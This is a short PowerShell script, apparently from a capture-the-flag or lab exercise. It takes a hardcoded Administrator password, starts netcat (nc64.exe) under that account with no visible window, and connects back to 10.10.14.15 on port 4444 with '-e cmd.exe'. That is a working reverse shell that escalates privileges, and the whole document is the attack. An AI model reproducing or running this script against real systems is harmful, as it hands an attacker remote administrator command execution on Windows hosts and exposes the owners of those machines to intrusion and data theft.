$username = 'Administrator';
$password = '!R3m0te!';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$Credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
 

$ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo

$ProcessInfo.FileName = "C:/Users/Public/nc64.exe"

$ProcessInfo.CreateNoWindow = $true

$ProcessInfo.WorkingDirectory = $env:windir
$ProcessInfo.RedirectStandardError = $true 
$ProcessInfo.RedirectStandardOutput = $true 
$ProcessInfo.UseShellExecute = $false

$ProcessInfo.Arguments = "10.10.14.15 4444 -e cmd.exe"

$ProcessInfo.Username = $Credential.GetNetworkCredential().username
$ProcessInfo.Domain = $Credential.GetNetworkCredential().Domain
$ProcessInfo.Password = $Credential.Password

$Process = New-Object System.Diagnostics.Process 
$Process.StartInfo = $ProcessInfo 
$Process.Start() | Out-Null 
$Process.WaitForExit() 

$GetProcessResult = $Process.StandardOutput.ReadToEnd()

$GetProcessResult